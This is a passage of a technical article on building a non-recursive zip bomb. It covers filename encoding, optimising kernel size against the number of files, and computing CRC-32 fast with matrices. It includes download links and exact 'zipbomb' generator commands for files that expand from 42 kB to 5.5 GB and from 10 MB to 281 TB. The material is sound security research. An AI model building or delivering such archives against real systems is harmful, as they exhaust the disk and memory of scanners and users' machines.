<img src="https://www.bamsoftware.com/hacks/zipbomb/max_uncompressed_size.png" alt="A scatterplot showing the maximum uncompressed data for a given DEFLATE stream size, for four compression engines: bulk_deflate, Zopfli, zlib, and Info-ZIP. The points form three lines because zlib and Info-ZIP were identical. All three lines have a slope of 1032. For a given DEFLATE stream size, bulk_deflate compresses about 15 kB more than Zopfli, and Zopfli compresses about 10 kB more than zlib/Info-ZIP.">
</picture>
</figure>

<p>
The price of bulk_deflate's high compression ratio is a lack of generality.
bulk_deflate can only compress strings of a single repeated byte,
and only those of specific lengths,
namely 517&nbsp;+&nbsp;258 <var>k</var> for integer <var>k</var>&nbsp;≥&nbsp;0.
Besides compressing densely, bulk_deflate is fast,
doing essentially constant work regardless of the input size,
aside from the work of actually writing out the compressed string.
</p>

</section>

<section id="filenames">
<h3>Filenames</h3>



<p>
For our purposes, filenames are mostly dead weight.
While filenames do contribute something to the output size
by virtue of being part of quoted local file headers,
a byte in a filename does not contribute nearly as much
as a byte in the kernel.
We want filenames to be as short as possible,
while keeping them all distinct,
and subject to compatibility considerations.
</p>



<p>
The first compatibility consideration is character encoding.
The zip format specification states that filenames
are to be interpreted as <a href="https://en.wikipedia.org/wiki/Code_page_437">CP&nbsp;437</a>,
or <a href="https://en.wikipedia.org/wiki/UTF-8">UTF-8</a> if a certain flag bit is set
(<a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT">APPNOTE.TXT Appendix&nbsp;D</a>).
But this is a major point of incompatibility
across zip parsers,
which may interpret filenames as being in
some fixed or locale-specific encoding.
So for compatibility, we must limit ourselves to characters
that have the same encoding in both
CP&nbsp;437 and UTF-8;
namely, the 95 printable characters of US-ASCII.
</p>



<p>
We are further restricted by filesystem naming limitations.
Some filesystems are case-insensitive, so "a" and "A" do not count as distinct names.
Common filesystems like FAT32
<a href="https://en.wikipedia.org/wiki/Comparison_of_file_systems#Limits">prohibit certain characters</a>
like '*' and '?'.
</p>

<p>
As a safe but not necessarily optimal compromise,
our zip bomb will use filenames consisting of characters
drawn from a 36-character alphabet
that does not
rely on case distinctions
or use special characters:
</p>
<figure>
0
1
2
3
4
5
6
7
8
9
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
</figure>
<p>
Filenames are generated in the obvious way,
cycling each position through the possible characters
and adding a position on overflow:
</p>
<figure>
"0", "1", "2", …, "Z",<br>
"00", "01", "02", …, "0Z",<br>
…,<br>
"Z0", "Z1", "Z2", …, "ZZ",<br>
"000", "001", "002", …
</figure>

<p>
There are 36 filenames of length&nbsp;1,
36<sup>2</sup> filenames of length&nbsp;2, and so on.
The length of the <var>n</var>th filename is
⌊log<sub>36</sub>((<var>n</var>&nbsp;+&nbsp;1)&nbsp;/&nbsp;(36 / 35))⌋&nbsp;+&nbsp;1.
<!--
The sum of the lengths of the first <var>n</var> filenames is
<var>d</var><var>n</var> − ((36<sup><var>d</var></sup> − 1) ⋅ (36 / 35<sup>2</sup>) − <var>d</var> / 35),
where <var>d</var> = &lfloor;log<sub>36</sub>(<var>n</var> / (36 / 35))&rfloor;.
-->
Four bytes are enough to represent
<data value="1727604">1 727 604</data> distinct filenames.
</p>

<p>
Given that the <var>N</var> filenames in the zip file
are generally not all of the same length,
which way should we order them,
shortest to longest or longest to shortest?
A&nbsp;little reflection shows that it is better to
put the longest names last, because those names are the most quoted.
Ordering filenames longest last
adds over <data value="929872440">900&nbsp;<abbr title="megabyte">MB</abbr></data> of output
to <a href="#allocation">zblg.zip</a>,
compared to ordering them longest first.
It is a minor optimization, though,
as those <data value="929872440">900&nbsp;<abbr title="megabyte">MB</abbr></data>
comprise only <data value="0.000003304504104">0.0003%</data>
of the total output size.
</p>

<!--
$ unzip -l zblg.zip | tail -n 1
281395456244934                     65534 files
$ unzip -l zblg.rev.zip | tail -n 1
281394526372494                     65534 files
$ python
>>> 281395456244934 - 281394526372494
929872440
>>> 929872440 / 281395456244934. * 100
0.00033045041039703735
-->

</section>

<section id="allocation">
<h3>Kernel size</h3>

<p>
The quoted-overlap construction
allows us to place a compressed kernel of data,
and then cheaply copy it many times.
For a given zip file size&nbsp;<var>X</var>,
how much space should we devote to storing the kernel,
and how much to making copies?
</p>

<p>
To find the optimum balance,
we only have to optimize the single variable <var>N</var>,
the number of files in the zip file.
Every value of <var>N</var> requires
a certain amount of overhead for
central directory headers,
local file headers,
quoting block headers, and filenames.
All the remaining space can be taken up by the kernel.
Because <var>N</var> has to be an integer,
and you can only fit so many files
before the kernel size drops to zero,
it suffices to test every possible value of <var>N</var>
and select the one that yields the most output.
</p>

<p>
Applying the optimization procedure to <var>X</var>&nbsp;=&nbsp;42 374,
the size of 42.zip,
finds a maximum at <var>N</var>&nbsp;=&nbsp;250.
Those 250 files require <data value="21195">21 195</data> bytes of overhead,
leaving <data value="21179">21 179</data> bytes for the kernel.
A&nbsp;kernel of that size decompresses to <data value="21841249">21 841 249</data> bytes
(a&nbsp;ratio of <data value="1031.2691345200435">1031.3</data>).
The 250 copies of the decompressed kernel,
plus the little bit extra that comes from the quoted local file headers,
produces an overall unzipped output of
5 461 307 620&nbsp;bytes
and a&nbsp;compression ratio of <data value="128883.45730872705">129&nbsp;thousand</data>.

</p><div id="download-zbsm">
<p><a href="https://www.bamsoftware.com/hacks/zipbomb/zbsm.zip" download=""><img src="https://www.bamsoftware.com/hacks/zipbomb/zip.png" alt=""> zbsm.zip</a>
<span><data value="42374">42&nbsp;<abbr title="kilobyte">kB</abbr></data>&nbsp;→&nbsp;<data value="5461307620">5.5&nbsp;<abbr title="gigabyte">GB</abbr></data></span></p><pre>zipbomb --mode=quoted_overlap --num-files=250 --compressed-size=21179 &gt; zbsm.zip</pre>
</div>

<p>
Optimization produced an almost even split
between the space allocated to the kernel
and the space allocated to file headers.
It is not a coincidence.
Let's look at a simplified model of the quoted-overlap construction.
In the simplified model,
we ignore filenames,
as well as the slight increase in output file size
due to quoting local file headers.
Analysis of the simplified model will show that the optimum
split between kernel and file headers is approximately even,
and that the output size grows quadratically
when allocation is optimal.
</p>

<p>
Define some constants and variables:
</p>

<figure>
<table>
<tbody><tr>
<td><var>X</var></td><td></td><td>zip file size (take as fixed)</td>
</tr>
<tr>
<td><var>N</var></td><td></td><td>number of files in the zip file (variable to optimize)</td>
</tr>
<tr>
<td>CDH</td><td>&nbsp;=&nbsp;46</td><td>size of a central directory header (without filename)</td>
</tr>
<tr>
<td>LFH</td><td>&nbsp;=&nbsp;30</td><td>size of a local file header (without filename)</td>
</tr>
<tr>
<td>Q</td><td>&nbsp;=&nbsp;5</td><td>the size of DEFLATE non-compressed block header</td>
</tr>
<tr>
<td>C</td><td>&nbsp;≈&nbsp;1032</td><td>compression ratio of the kernel</td>
</tr>
</tbody></table>
</figure>

<!--
JACAL session to do the algebra and calculus:

# S_X(N)
e1 : C * N * (X - (N * (LFH + CDH) + (N - 1) * Q)));
                                                  ^

                       2             2
e1: (- C CDH - C LFH) N  + (C N - C N ) Q + C N X

# S_X(N) as a polynomial in N
e2 : coeffs(e1, N);

e2: [0, C Q + C X, - C CDH - C LFH - C Q]

# S'_X(N)
e3 : diff(e1, N);

e3: (- 2 C CDH - 2 C LFH) N + (C - 2 C N) Q + C X

# S'_X(N) as a polynomial in N
e4 : coeffs(e3, N);

e4: [C Q + C X, - 2 C CDH - 2 C LFH - 2 C Q]

# Solve S'_X(N) = 0. e5 == N_OPT
e5 : suchthat(N, e3);

           Q + X
e5: - - - - - - - - - -
    2 CDH + 2 LFH + 2 Q

# H(N_OPT)
e6 : e5 * (LFH + CDH) + (e5 - 1) * Q;

    - Q + X
e6: - - - -
       2

# S_X(N_OPT)
e7 : -C * (CDH + LFH + Q) * e5^2 + C * (Q + X) * e5;

       2                2
    C Q  + 2 C Q X + C X
e7: - - - - - - - - - - -
     4 CDH + 4 LFH + 4 Q
-->

<p>
Let <var>H</var>(<var>N</var>)
be the amount of header overhead required by <var>N</var> files.
Refer to
<a href="#fig-quote">the diagram</a>
to understand where this formula comes from.
</p>

<figure>
<table>
<tbody><tr>
<td><var>H</var>(<var>N</var>)</td><td>&nbsp;= <var>N</var>&nbsp;⋅&nbsp;(CDH + LFH) + (<var>N</var>&nbsp;−&nbsp;1)&nbsp;⋅&nbsp;Q</td>
</tr>
</tbody></table>
</figure>

<p>
The space remaining for the kernel is
<var>X</var>&nbsp;−&nbsp;<var>H</var>(<var>N</var>).
The total unzipped size
<var>S</var><sub><var>X</var></sub>(<var>N</var>)
is the size of <var>N</var> copies
of the kernel,
decompressed at ratio&nbsp;C.
(In this simplified model we ignore
the minor additional expansion from quoted local file headers.)
</p>

<figure>
<table>
<tbody><tr>
<td><var>S</var><sub><var>X</var></sub>(<var>N</var>)</td><td>&nbsp;= (<var>X</var> − <var>H</var>(<var>N</var>)) C <var>N</var></td>
</tr>
<tr>
<td></td><td>&nbsp;= (<var>X</var> − (<var>N</var> ⋅ (CDH + LFH) + (<var>N</var> − 1) ⋅ Q)) C <var>N</var></td>
</tr>
<tr>
<td></td><td>&nbsp;= −(CDH + LFH + Q) C <var>N</var><sup>2</sup> + (<var>X</var> + Q) C <var>N</var></td>
</tr>
</tbody></table>
</figure>

<p>
<var>S</var><sub><var>X</var></sub>(<var>N</var>) is a polynomial in <var>N</var>,
so its maximum must be at a place where the derivative
<var>S</var>′<sub><var>X</var></sub>(<var>N</var>)
is zero.
Taking the derivative and finding the zero gives us
<var>N</var><sub>OPT</sub>,
the optimal number of files.
</p>

<figure>
<table>
<tbody><tr>
<td><var>S</var>′<sub><var>X</var></sub>(<var>N</var><sub>OPT</sub>)</td><td>&nbsp;= −2 (CDH + LFH + Q) C <var>N</var><sub>OPT</sub> + (<var>X</var> + Q) C</td>
</tr>
<tr>
<td>0</td><td>&nbsp;= −2 (CDH + LFH + Q) C <var>N</var><sub>OPT</sub> + (<var>X</var> + Q) C</td>
</tr>
<tr>
<td><var>N</var><sub>OPT</sub></td><td>&nbsp;= (<var>X</var> + Q) / (CDH + LFH + Q) / 2</td>
</tr>
</tbody></table>
</figure>

<p>
<var>H</var>(<var>N</var><sub>OPT</sub>)
gives the optimal amount of space to allocate for file headers.
It is independent of CDH, LFH, and C,
and is close to <var>X</var> / 2.
</p>

<figure>
<table>
<tbody><tr>
<td><var>H</var>(<var>N</var><sub>OPT</sub>)</td><td>&nbsp;= <var>N</var><sub>OPT</sub> ⋅ (CDH + LFH) + (<var>N</var><sub>OPT</sub> − 1) ⋅ Q</td>
</tr>
<tr>
<td></td><td>&nbsp;= (<var>X</var> − Q) / 2</td>
</tr>
</tbody></table>
</figure>

<p>
<var>S</var><sub><var>X</var></sub>(<var>N</var><sub>OPT</sub>)
is the total unzipped size
when the allocation is optimal.
From this we see that the output size grows quadratically
in the input size.
</p>

<figure id="eq-S_X_N_OPT">
<table>
<tbody><tr>
<td>
<var>S</var><sub><var>X</var></sub>(<var>N</var><sub>OPT</sub>)</td><td>&nbsp;= (<var>X</var> + Q)<sup>2</sup> C / (CDH + LFH + Q) / 4</td>
</tr>
</tbody></table>
</figure>



<p>
As we make the zip file larger,
eventually we run into the limits of the zip format.
A&nbsp;zip file can contain at most 2<sup>16</sup>&nbsp;−&nbsp;1 files,
and each file can have an uncompressed size of at most 2<sup>32</sup>&nbsp;−&nbsp;1 bytes.
Worse than that,
<a href="#compatibility">some implementations</a>
take the maximum possible values
as an indicator of the presence of <a href="#zip64">64-bit extensions</a>,
so our limits are actually 2<sup>16</sup>&nbsp;−&nbsp;2 and 2<sup>32</sup>&nbsp;−&nbsp;2.
<!--
https://github.com/golang/go/commit/4aedbf5be4631693f774063410707ef467ca78e7
https://github.com/golang/go/commit/b6c5edae7c0e9dd6d12dbb8f1c9638dea45f9464
-->
It happens that the first limit we hit is the one on uncompressed file size.
At a zip file size of 8 319 377&nbsp;bytes,
naive optimization would give us a file count of 47 837
and a largest file of
2<sup>32</sup>&nbsp;+&nbsp;311 bytes.
</p>

<!--
$compressed_size
[1] 4160277

$num_files
[1] 47837

[1] "zipped size" "8319377"
[1] "unzipped size"   "205420672417247"
[1] 4294967607
-->

<p>
Accepting that we cannot increase <var>N</var> nor the size of the kernel without bound,
we would like find the maximum compression ratio achievable
while remaining within the limits of the zip format.
The way to proceed is to make the kernel as large as possible,
and have the maximum number of files.
Even though we can no longer maintain the roughly even split
between kernel and file headers,
each added file <em>does</em> increase the compression ratio—just
not as fast as it would if we were able to keep growing the kernel, too.
In fact, as we add files we will need to <em>decrease</em> the size of the kernel
to make room for the maximum file size
that gets slightly larger with each added file.
</p>

<p>
The plan results in a zip file
that contains 2<sup>16</sup>&nbsp;−&nbsp;2 files and a kernel that decompresses
to 2<sup>32</sup>&nbsp;−&nbsp;2 178 825 bytes.
Files get longer towards the beginning of the zip file—the
first and largest file decompresses to
2<sup>32</sup>&nbsp;−&nbsp;56 bytes.
That is as close as we can get using the coarse
output sizes of bulk_deflate—encoding
the final 54&nbsp;bytes would cost more bytes than they are worth.
(The zip file as a whole has a compression ratio
of 28&nbsp;million, and the final 54&nbsp;bytes would gain
at most 54&nbsp;⋅&nbsp;1032&nbsp;⋅&nbsp;(2<sup>16</sup>&nbsp;−&nbsp;2) ≈ <data value="3652078752">36.5&nbsp;million bytes</data>,
so it only helps if the 54&nbsp;bytes can be encoded
in 1&nbsp;byte—I&nbsp;could not do it in less than&nbsp;2.)
The output size of this zip bomb, 281 395 456 244 934&nbsp;bytes,
is 99.97% of the theoretical maximum
(2<sup>32</sup>&nbsp;−&nbsp;1) ⋅ (2<sup>16</sup>&nbsp;−&nbsp;1).
<!-- 65 535 × 0xffffffff = <data value="281470681677825">281 470 681 677 825</data>. -->
Any major improvements to the compression ratio can only come
from reducing the input size,
not increasing the output size.
<!--
>>> (2**32-1)*65535 - 281399752637796
70929040029
>>> 70929040029. / ((2**32-1)*65535)
0.00025199441592352524
>>> 1 - _
0.9997480055840765
>>> _ * 100
99.97480055840765
-->
</p>

<div id="download-zblg">
<p><a href="https://www.bamsoftware.com/hacks/zipbomb/zblg.zip" download=""><img src="https://www.bamsoftware.com/hacks/zipbomb/zip.png" alt=""> zblg.zip</a>
<span><data value="9893525">10&nbsp;<abbr title="megabyte">MB</abbr></data>&nbsp;→&nbsp;<data value="281395456244934">281&nbsp;<abbr title="terabyte">TB</abbr></data></span></p><pre>zipbomb --mode=quoted_overlap --num-files=65534 --max-uncompressed-size=4292788525 &gt; zblg.zip</pre>
</div>

</section>

</section>

<section id="crc32">
<h2>Efficient CRC-32 computation</h2>

<p>
Among the metadata in the central directory header and local file header
is a
<a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">CRC-32</a>
checksum of the uncompressed file data.
This poses a problem, because directly calculating the CRC-32 of each file
requires doing work proportional to the total <em>unzipped</em> size,
which is large by design. (It's a zip bomb, after all.)
We would prefer to do work that in the worst case is
proportional to the <em>zipped</em> size.
Two factors work in our advantage:
all files share a common suffix (the kernel),
and the uncompressed kernel is a string of repeated bytes.
We will represent CRC-32 as a matrix product—this
will allow us not only to compute the checksum of the kernel quickly,
but also to reuse computation across files.
The technique described in this section is a slight extension of the
<a href="https://github.com/madler/zlib/blob/v1.2.11/crc32.c#L372"><code>crc32_combine</code></a>
function in zlib,
which Mark Adler explains
<a href="https://stackoverflow.com/questions/23122312/crc-calculation-of-a-mostly-static-data-stream/23126768#23126768">here</a>.
</p>

<p>
You can model CRC-32 as a state machine that updates a 32-bit state register
for each incoming bit.
The basic update operations for a 0&nbsp;bit and a 1&nbsp;bit are:
</p>

<figure>
<pre><code>uint32 crc32_update_0(uint32 state) {
    // Shift out the least significant bit.
    bit b = state &amp; 1;
    state = state &gt;&gt; 1;
    // If the shifted-out bit was 1, XOR with the CRC-32 constant.
    if (b == 1)
        state = state ^ 0xedb88320;
    return state;
}

uint32 crc32_update_1(uint32 state) {
    // Do as for a 0 bit, then XOR with the CRC-32 constant.
    return crc32_update_0(state) ^ 0xedb88320;
}</code></pre>
</figure>

<p>
If you think of the state register as a 32-element binary vector,
and use XOR for addition and AND for multiplication, then
<code>crc32_update_0</code> is a
<a href="https://en.wikipedia.org/wiki/Linear_map">linear transformation</a>;
i.e., it can be represented as multiplication by a
32×32 binary
<a href="https://en.wikipedia.org/wiki/Transformation_matrix">transformation matrix</a>.
To see why, observe that multiplying a matrix by a vector
is just summing the columns of the matrix,
after multiplying each column by the corresponding element of the vector.
The shift operation <code>state&nbsp;&gt;&gt;&nbsp;1</code>
is just taking each bit&nbsp;<var>i</var> of the state vector
and multiplying it by a vector that is 0 everywhere except at bit <var>i</var>&nbsp;−&nbsp;1
(numbering the bits from right to left).
The conditional final XOR <code>state&nbsp;^&nbsp;0xedb88320</code>
that only happens when bit&nbsp;<code>b</code> is 1
can instead be represented as first multiplying
<code>b</code> by 0xedb88320
and then XORing it into the state.
</p>

<p>
Furthermore, <code>crc32_update_1</code> is just
<code>crc32_update_0</code> plus (XOR) a&nbsp;constant.
That makes <code>crc32_update_1</code> an
<a href="https://en.wikipedia.org/wiki/Affine_transformation">affine transformation</a>:
a&nbsp;matrix multiplication followed by a translation (i.e., vector addition).
We can represent both the matrix multiplication and the translation
in a single step
if we enlarge the dimensions of the transformation matrix to 33×33
and append an extra element to the state vector that is always&nbsp;1.
(This representation is called
<a href="https://en.wikipedia.org/wiki/Transformation_matrix#Affine_transformations">homogeneous coordinates</a>.)
</p>

<figure>

<table>
<caption><var>M</var><sub>0</sub></caption>
<tbody>
<tr><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td></tr>
